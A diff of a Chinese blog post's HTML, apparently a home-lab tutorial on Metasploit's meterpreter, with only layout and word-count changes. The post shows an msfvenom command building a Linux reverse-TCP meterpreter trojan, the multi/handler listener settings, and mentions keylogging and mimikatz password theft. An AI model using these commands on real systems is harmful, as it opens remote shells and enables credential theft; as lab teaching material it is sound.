@@ -86,13 +86,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.8k
+                    2.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    3 mins.
+                    2 mins.
                 </span>
                 
                 
@@ -132,11 +132,11 @@
 <li>Kali:192.168.229.139</li>
 <li>Ubuntu:192.168.229.135</li>
 </ul>
-<p>首先用 <strong>msfvenom</strong> 生成一个反弹shell的木马<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o shell</span><br><span class="line"></span><br><span class="line">-p payload</span><br><span class="line">-f 输出的格式</span><br><span class="line">-o 输出的文件名</span><br></pre></td></tr></table></div></figure></p>
+<p>首先用 <strong>msfvenom</strong> 生成一个反弹shell的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o shell</span><br><span class="line"></span><br><span class="line">-p payload</span><br><span class="line">-f 输出的格式</span><br><span class="line">-o 输出的文件名</span><br></pre></td></tr></table></figure></p>
 <p>然后将生成的木马搞到我们的目标机器上(这里就直接搬过去了)，放在了tmp目录下，一般这个目录下都会有可执行的权限，没有我们就(chmod +x shell)<br><img src="/2019/10/14/后渗透之meterpreter初体验/ubuntu.png" alt></p>
-<p>然后我们打开msf控制台，使用我们的模块，并设定Payload和本地的ip:<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.229.139</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure></p>
+<p>然后我们打开msf控制台，使用我们的模块，并设定Payload和本地的ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.229.139</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/10/14/后渗透之meterpreter初体验/options.png" alt><br>然后我们在目标机器上运行我们的shell文件<br><img src="/2019/10/14/后渗透之meterpreter初体验/success.png" alt><br>这样就反弹成功啦~</p>
-<p><img src="/2019/10/14/后渗透之meterpreter初体验/unavailable.png" alt><br>可能会出现这样的问题，就是我们设定的端口被占用了，要关闭端口。<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 4444</span><br></pre></td></tr></table></div></figure></p>
+<p><img src="/2019/10/14/后渗透之meterpreter初体验/unavailable.png" alt><br>可能会出现这样的问题，就是我们设定的端口被占用了，要关闭端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 4444</span><br></pre></td></tr></table></figure></p>
 <h1 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h1><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
 <p>meterpreter可以进行shell命令、提权、mimikatz抓取密码、屏幕截图、键盘记录等，挺方便的。后续再慢慢玩这些功能</p>
 
